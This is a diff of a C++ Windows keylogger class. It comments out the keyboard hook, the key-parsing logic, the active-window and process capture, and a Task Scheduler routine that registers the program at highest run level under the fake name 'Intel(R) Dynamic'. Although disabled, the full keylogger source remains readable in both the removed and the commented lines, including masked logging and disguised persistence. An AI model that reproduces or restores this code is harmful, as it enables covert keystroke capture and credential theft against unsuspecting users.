@@ -8,8 +8,8 @@
 #include <windows.h>
 #include <taskschd.h>
 #include <comutil.h>
-#include <Psapi.h>
-#include <comdef.h>
+//#include <Psapi.h>
+//#include <comdef.h>
 #include <filesystem>
 
 //#include <shlobj.h> // For SHGetFolderPath
@@ -54,7 +54,7 @@ void KeyLogger::Init()
 */
 	s_EncodeMask = 0x3F3E; // Set Encode mask
 	ReadFromFile();
-	s_KeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardCallback, GetModuleHandle(NULL), 0); // Set keyboard Hook
+	//s_KeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardCallback, GetModuleHandle(NULL), 0); // Set keyboard Hook
 	if (s_KeyboardHook)
 		std::cout << "Hook set" << std::endl;
 	else
@@ -65,19 +65,19 @@ void KeyLogger::Init()
 	if (res != S_OK) // task scheduler setup failed, probably access denied
 	{
 		// Get Error
-		_com_error err(res);
-		LPCTSTR errMsg = err.ErrorMessage();
-		std::wstring errorMsgWide(errMsg);
-		errorMsgWide.push_back(L'\n');
+		//_com_error err(res);
+		//LPCTSTR errMsg = err.ErrorMessage();
+		//std::wstring errorMsgWide(errMsg);
+		//errorMsgWide.push_back(L'\n');
 
 		// Log error message
 		std::u16string str = u"\nTask Creation Failed. Error Code: ";
 		std::cout << "\nTask Creation Failed" << std::endl;
 		ApplyMask(&str);
-		ApplyMask(&errorMsgWide);
+		//ApplyMask(&errorMsgWide);
 		
-		std::string utf8Character = s_Utf16To8Converter.to_bytes(str) + s_WCharTo8ConverterWChar.to_bytes(errorMsgWide);
-		auto& x = (s_LogFileStream << utf8Character << std::flush);
+		//std::string utf8Character = s_Utf16To8Converter.to_bytes(str) + s_WCharTo8ConverterWChar.to_bytes(errorMsgWide);
+		//auto& x = (s_LogFileStream << utf8Character << std::flush);
 
 		// do autostart by autostart folder
 	}
@@ -92,11 +92,11 @@ void KeyLogger::Run()
 	std::cout << "Initializing Finished" << std::endl;
 	std::cout << "KeyLogger Started." << std::endl;
 	MSG msg;
-	while (BOOL bRet = GetMessage(&msg, NULL, 0, 0) != 0) // GetMessage blocks this thread and gets messages for callbacks
+	//while (BOOL bRet = GetMessage(&msg, NULL, 0, 0) != 0) // GetMessage blocks this thread and gets messages for callbacks
 	{
 		// Get error message if GetMessage returned something other than WM_QUIT = 0
-		TranslateMessage(&msg);
-		DispatchMessage(&msg);
+// 		TranslateMessage(&msg);
+// 		DispatchMessage(&msg);
 
 		// Print the message or something?
 	}
@@ -136,116 +136,116 @@ LRESULT KeyLogger::KeyboardCallback(int code, WPARAM wParam, LPARAM lParam)
 		}
 	}
 
-	return CallNextHookEx(s_KeyboardHook, code, wParam, lParam);
+	return 0;// CallNextHookEx(s_KeyboardHook, code, wParam, lParam);
 }
 
 std::u16string KeyLogger::ParseChar(char16_t character)
 {
-	bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000);
-	bool capsLockOn = GetKeyState(VK_CAPITAL);
-	bool altPressed = GetAsyncKeyState(VK_RMENU) & 0x8000;
-
-	// polish characters
-	if (std::isalpha(character))
-	{
-		if (altPressed)
-		{
-			switch (character)
-			{
-			case L'E': return (shiftPressed || capsLockOn) ? u"Ę" : u"ę";
-			case L'L': return (shiftPressed || capsLockOn) ? u"Ł" : u"ł";
-			case L'O': return (shiftPressed || capsLockOn) ? u"Ó" : u"ó";
-			case L'A': return (shiftPressed || capsLockOn) ? u"Ą" : u"ą";
-			case L'S': return (shiftPressed || capsLockOn) ? u"Ś" : u"ś";
-			case L'Z': return (shiftPressed || capsLockOn) ? u"Ż" : u"ż";
-			case L'X': return (shiftPressed || capsLockOn) ? u"Ź" : u"ź";
-			case L'C': return (shiftPressed || capsLockOn) ? u"Ć" : u"ć";
-			case L'N': return (shiftPressed || capsLockOn) ? u"Ń" : u"ń";
-			default: return u"";
-			}
-		}
-		else
-			character = (shiftPressed || capsLockOn) ? std::toupper(character) : std::tolower(character);
-	}
-	else
-	{
-		//https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
-		switch (character)
-		{
-			case VK_LEFT: return u"|LEFT|";
-			case VK_UP: return u"|UP|";
-			case VK_DOWN: return u"|DOWN|";
-			case VK_RIGHT: return u"|RIGHT|";
-			case 0x31: return shiftPressed ? u"!" : u"1";
-			case 0x32: return shiftPressed ? u"@" : u"2";
-			case 0x33: return shiftPressed ? u"#" : u"3";
-			case 0x34: return shiftPressed ? u"$" : u"4";
-			case 0x35: return shiftPressed ? u"%" : u"5";
-			case 0x36: return shiftPressed ? u"^" : u"6";
-			case 0x37: return shiftPressed ? u"&" : u"7";
-			case 0x38: return shiftPressed ? u"*" : u"8";
-			case 0x39: return shiftPressed ? u"(" : u"9";
-			case 0x30: return shiftPressed ? u")" : u"0";
-			case VK_OEM_1: return shiftPressed ? u":" : u";";
-			case VK_OEM_2: return shiftPressed ? u"?" : u"/";
-			case VK_OEM_3: return shiftPressed ? u"~" : u"`";
-			case VK_OEM_4: return shiftPressed ? u"{" : u"[";
-			case VK_OEM_5: return shiftPressed ? u"|" : u"\\";
-			case VK_OEM_6: return shiftPressed ? u"}" : u"]";
-			case VK_OEM_7: return shiftPressed ? u"\"" : u"'";
-			case VK_OEM_MINUS: return shiftPressed ? u"_" : u"-";
-			case VK_OEM_PLUS: return shiftPressed ? u"+" : u"=";
-			case VK_OEM_COMMA: return shiftPressed ? u"<" : u",";
-			case VK_OEM_PERIOD: return shiftPressed ? u">" : u".";
-			case VK_BACK: return u"|BACK|"; // backspace
-			case VK_DELETE: return u"|DEL|";
-			case VK_END: return u"|END|";
-			case VK_HOME: return u"|HOME|";
-			case VK_PRIOR: return u"|PAGE UP|";
-			case VK_NEXT: return u"|PAGE DOWN|";
-			case VK_SNAPSHOT: return u"|SCREEN SHOT|";
-			case VK_INSERT: return u"|INSERT|";
-			case VK_SPACE: return u" ";
-			case VK_RETURN: return u"|RETURN|";
-
-			default: return u"";
-		}
-	}
-
-	std::u16string str;
-	str.push_back(character);
-	return str;
+// 	bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000);
+// 	bool capsLockOn = GetKeyState(VK_CAPITAL);
+// 	bool altPressed = GetAsyncKeyState(VK_RMENU) & 0x8000;
+// 
+// 	// polish characters
+// 	if (std::isalpha(character))
+// 	{
+// 		if (altPressed)
+// 		{
+// 			switch (character)
+// 			{
+// 			case L'E': return (shiftPressed || capsLockOn) ? u"Ę" : u"ę";
+// 			case L'L': return (shiftPressed || capsLockOn) ? u"Ł" : u"ł";
+// 			case L'O': return (shiftPressed || capsLockOn) ? u"Ó" : u"ó";
+// 			case L'A': return (shiftPressed || capsLockOn) ? u"Ą" : u"ą";
+// 			case L'S': return (shiftPressed || capsLockOn) ? u"Ś" : u"ś";
+// 			case L'Z': return (shiftPressed || capsLockOn) ? u"Ż" : u"ż";
+// 			case L'X': return (shiftPressed || capsLockOn) ? u"Ź" : u"ź";
+// 			case L'C': return (shiftPressed || capsLockOn) ? u"Ć" : u"ć";
+// 			case L'N': return (shiftPressed || capsLockOn) ? u"Ń" : u"ń";
+// 			default: return u"";
+// 			}
+// 		}
+// 		else
+// 			character = (shiftPressed || capsLockOn) ? std::toupper(character) : std::tolower(character);
+// 	}
+// 	else
+// 	{
+// 		//https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
+// 		switch (character)
+// 		{
+// 			case VK_LEFT: return u"|LEFT|";
+// 			case VK_UP: return u"|UP|";
+// 			case VK_DOWN: return u"|DOWN|";
+// 			case VK_RIGHT: return u"|RIGHT|";
+// 			case 0x31: return shiftPressed ? u"!" : u"1";
+// 			case 0x32: return shiftPressed ? u"@" : u"2";
+// 			case 0x33: return shiftPressed ? u"#" : u"3";
+// 			case 0x34: return shiftPressed ? u"$" : u"4";
+// 			case 0x35: return shiftPressed ? u"%" : u"5";
+// 			case 0x36: return shiftPressed ? u"^" : u"6";
+// 			case 0x37: return shiftPressed ? u"&" : u"7";
+// 			case 0x38: return shiftPressed ? u"*" : u"8";
+// 			case 0x39: return shiftPressed ? u"(" : u"9";
+// 			case 0x30: return shiftPressed ? u")" : u"0";
+// 			case VK_OEM_1: return shiftPressed ? u":" : u";";
+// 			case VK_OEM_2: return shiftPressed ? u"?" : u"/";
+// 			case VK_OEM_3: return shiftPressed ? u"~" : u"`";
+// 			case VK_OEM_4: return shiftPressed ? u"{" : u"[";
+// 			case VK_OEM_5: return shiftPressed ? u"|" : u"\\";
+// 			case VK_OEM_6: return shiftPressed ? u"}" : u"]";
+// 			case VK_OEM_7: return shiftPressed ? u"\"" : u"'";
+// 			case VK_OEM_MINUS: return shiftPressed ? u"_" : u"-";
+// 			case VK_OEM_PLUS: return shiftPressed ? u"+" : u"=";
+// 			case VK_OEM_COMMA: return shiftPressed ? u"<" : u",";
+// 			case VK_OEM_PERIOD: return shiftPressed ? u">" : u".";
+// 			case VK_BACK: return u"|BACK|"; // backspace
+// 			case VK_DELETE: return u"|DEL|";
+// 			case VK_END: return u"|END|";
+// 			case VK_HOME: return u"|HOME|";
+// 			case VK_PRIOR: return u"|PAGE UP|";
+// 			case VK_NEXT: return u"|PAGE DOWN|";
+// 			case VK_SNAPSHOT: return u"|SCREEN SHOT|";
+// 			case VK_INSERT: return u"|INSERT|";
+// 			case VK_SPACE: return u" ";
+// 			case VK_RETURN: return u"|RETURN|";
+// 
+// 			default: return u"";
+// 		}
+// 	}
+// 
+ 	std::u16string str;
+// 	str.push_back(character);
+ 	return str;
 }
 
 std::u16string KeyLogger::GetCurrentWindowInfo()
 {
-	HWND hwnd = GetForegroundWindow(); // Get handle to active window
-	if (hwnd != NULL) 
-	{
-		wchar_t processName[MAX_PATH];
-		DWORD processID;
-		GetWindowThreadProcessId(hwnd, &processID);
-		HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
-
-		if (processHandle != NULL) 
-		{
-			GetModuleFileNameEx(processHandle, NULL, processName, MAX_PATH);
-			CloseHandle(processHandle);
-		}
-		else 
-		{
-			wchar_t data[MAX_PATH] = L"Unable to open process.";
-			memcpy(&processName, &data, MAX_PATH);
-		}
-
-		const int bufferSize = 256;
-		wchar_t windowTitle[bufferSize];
-		HRESULT x = GetWindowText(hwnd, windowTitle, bufferSize);
-		std::u16string windowTitle16(reinterpret_cast<const char16_t*>(windowTitle));
-		std::u16string processName16(reinterpret_cast<const char16_t*>(processName)); // ignore the warning
-		return u"[WindowTitle: " + windowTitle16 + u", Process: " + processName16 + u"]";
-	}
-	else 
+// 	HWND hwnd = GetForegroundWindow(); // Get handle to active window
+// 	if (hwnd != NULL) 
+// 	{
+// 		wchar_t processName[MAX_PATH];
+// 		DWORD processID;
+// 		GetWindowThreadProcessId(hwnd, &processID);
+// 		HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
+// 
+// 		if (processHandle != NULL) 
+// 		{
+// 			//GetModuleFileNameEx(processHandle, NULL, processName, MAX_PATH);
+// 			CloseHandle(processHandle);
+// 		}
+// 		else 
+// 		{
+// 			wchar_t data[MAX_PATH] = L"Unable to open process.";
+// 			memcpy(&processName, &data, MAX_PATH);
+// 		}
+// 
+// 		const int bufferSize = 256;
+// 		wchar_t windowTitle[bufferSize];
+// 		HRESULT x = GetWindowText(hwnd, windowTitle, bufferSize);
+// 		std::u16string windowTitle16(reinterpret_cast<const char16_t*>(windowTitle));
+// 		std::u16string processName16(reinterpret_cast<const char16_t*>(processName)); // ignore the warning
+// 		return u"[WindowTitle: " + windowTitle16 + u", Process: " + processName16 + u"]";
+// 	}
+// 	else 
 	{
 		return u"No active window found.";
 	}
@@ -541,88 +541,88 @@ int KeyLogger::ReceiveBroadcast()
 
 HRESULT KeyLogger::InitTaskSheduler()
 {
-	COM_VERIFY(CoInitializeEx(NULL, COINIT_MULTITHREADED));
-
-	// Get task scheduler service and connect it with this application
-	ITaskService* pService = NULL;
-	COM_VERIFY(CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService));
-	COM_VERIFY(pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t()));
-
-	// Create new task object
-	ITaskDefinition* pTask = NULL;
-	COM_VERIFY(pService->NewTask(0, &pTask));
-
-	// Get Task Principal
-	IPrincipal* pPrincipal = NULL;
-	pTask->get_Principal(&pPrincipal);
-	pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST); // Set run as administrator
-	pPrincipal->Release();
-
-	// Get task settings and set task to run as soon as possible after trigger condition is met
-	ITaskSettings* pSettings = NULL;
-	COM_VERIFY(pTask->get_Settings(&pSettings));
-	COM_VERIFY(pSettings->put_StartWhenAvailable(VARIANT_TRUE));
-	pSettings->Release();
-
-	// Get trigger collection (tasks can have multiple triggers)
-	ITriggerCollection* pTriggerCollection = NULL;
-	COM_VERIFY(pTask->get_Triggers(&pTriggerCollection));
-
-	// Add new trigger to trigger collection
-	ITrigger* pTrigger = NULL;
-	COM_VERIFY(pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger));
-	pTriggerCollection->Release();
-
-	// Get pointer to a previously added trigger
-	ILogonTrigger* pLogonTrigger = NULL;
-	COM_VERIFY(pTrigger->QueryInterface(IID_ILogonTrigger, (void**)&pLogonTrigger));
-	pTrigger->Release();
-
-	// Configure the trigger
-	COM_VERIFY(pLogonTrigger->put_Id(_bstr_t(L"Trigger1"))); // set the identifier for the trigger. It is used to identify trigger if there are multiple triggers in one task
-	COM_VERIFY(pLogonTrigger->put_UserId(NULL)); // set the user for which the trigger will work, NULL is current user
-	pLogonTrigger->Release();
-
-	// Get action collection (there can be multiple actions bound to single task)
-	IActionCollection* pActionCollection = NULL;
-	pTask->get_Actions(&pActionCollection);
-
-	// Add new action
-	IAction* pAction = NULL;
-	COM_VERIFY(pActionCollection->Create(TASK_ACTION_EXEC, &pAction)); // add execute action
-	pActionCollection->Release();
-
-	// Get previously added action
-	IExecAction* pExecAction = NULL;
-	COM_VERIFY(pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction));
-	pAction->Release();
-
-	// Configure the action
-	COM_VERIFY(pExecAction->put_Path(_bstr_t(s_ApplicationName.c_str()))); // tell it what to execute
-	pExecAction->Release();
-
-	ITaskFolder* pRootFolder = NULL;
-	pService->GetFolder(_bstr_t(L"\\"), &pRootFolder); // Get pointer to a tasks root folder
-
-	// Finally register the task
-	IRegisteredTask* pRegisteredTask = NULL;
-	COM_VERIFY(pRootFolder->RegisterTaskDefinition(
-		_bstr_t(L"Intel(R) Dynamic"),
-		pTask,
-		TASK_CREATE_OR_UPDATE,
-		_variant_t(),
-		_variant_t(),
-		TASK_LOGON_INTERACTIVE_TOKEN,
-		_variant_t(L""),
-		&pRegisteredTask)
-	);
-
-	// Cleanup, disconnect the COM library from the application
-	pService->Release();
-	pTask->Release();
-	CoUninitialize();
-
-	return S_OK;
+// 	COM_VERIFY(CoInitializeEx(NULL, COINIT_MULTITHREADED));
+// 
+// 	// Get task scheduler service and connect it with this application
+// 	ITaskService* pService = NULL;
+// 	COM_VERIFY(CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService));
+// 	COM_VERIFY(pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t()));
+// 
+// 	// Create new task object
+// 	ITaskDefinition* pTask = NULL;
+// 	COM_VERIFY(pService->NewTask(0, &pTask));
+// 
+// 	// Get Task Principal
+// 	IPrincipal* pPrincipal = NULL;
+// 	pTask->get_Principal(&pPrincipal);
+// 	pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST); // Set run as administrator
+// 	pPrincipal->Release();
+// 
+// 	// Get task settings and set task to run as soon as possible after trigger condition is met
+// 	ITaskSettings* pSettings = NULL;
+// 	COM_VERIFY(pTask->get_Settings(&pSettings));
+// 	COM_VERIFY(pSettings->put_StartWhenAvailable(VARIANT_TRUE));
+// 	pSettings->Release();
+// 
+// 	// Get trigger collection (tasks can have multiple triggers)
+// 	ITriggerCollection* pTriggerCollection = NULL;
+// 	COM_VERIFY(pTask->get_Triggers(&pTriggerCollection));
+// 
+// 	// Add new trigger to trigger collection
+// 	ITrigger* pTrigger = NULL;
+// 	COM_VERIFY(pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger));
+// 	pTriggerCollection->Release();
+// 
+// 	// Get pointer to a previously added trigger
+// 	ILogonTrigger* pLogonTrigger = NULL;
+// 	COM_VERIFY(pTrigger->QueryInterface(IID_ILogonTrigger, (void**)&pLogonTrigger));
+// 	pTrigger->Release();
+// 
+// 	// Configure the trigger
+// 	COM_VERIFY(pLogonTrigger->put_Id(_bstr_t(L"Trigger1"))); // set the identifier for the trigger. It is used to identify trigger if there are multiple triggers in one task
+// 	COM_VERIFY(pLogonTrigger->put_UserId(NULL)); // set the user for which the trigger will work, NULL is current user
+// 	pLogonTrigger->Release();
+// 
+// 	// Get action collection (there can be multiple actions bound to single task)
+// 	IActionCollection* pActionCollection = NULL;
+// 	pTask->get_Actions(&pActionCollection);
+// 
+// 	// Add new action
+// 	IAction* pAction = NULL;
+// 	COM_VERIFY(pActionCollection->Create(TASK_ACTION_EXEC, &pAction)); // add execute action
+// 	pActionCollection->Release();
+// 
+// 	// Get previously added action
+// 	IExecAction* pExecAction = NULL;
+// 	COM_VERIFY(pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction));
+// 	pAction->Release();
+// 
+// 	// Configure the action
+// 	COM_VERIFY(pExecAction->put_Path(_bstr_t(s_ApplicationName.c_str()))); // tell it what to execute
+// 	pExecAction->Release();
+// 
+// 	ITaskFolder* pRootFolder = NULL;
+// 	pService->GetFolder(_bstr_t(L"\\"), &pRootFolder); // Get pointer to a tasks root folder
+// 
+// 	// Finally register the task
+// 	IRegisteredTask* pRegisteredTask = NULL;
+// 	COM_VERIFY(pRootFolder->RegisterTaskDefinition(
+// 		_bstr_t(L"Intel(R) Dynamic"),
+// 		pTask,
+// 		TASK_CREATE_OR_UPDATE,
+// 		_variant_t(),
+// 		_variant_t(),
+// 		TASK_LOGON_INTERACTIVE_TOKEN,
+// 		_variant_t(L""),
+// 		&pRegisteredTask)
+// 	);
+// 
+// 	// Cleanup, disconnect the COM library from the application
+// 	pService->Release();
+// 	pTask->Release();
+// 	CoUninitialize();
+// 
+ 	return S_OK;
 }
 
 HHOOK KeyLogger::s_KeyboardHook;
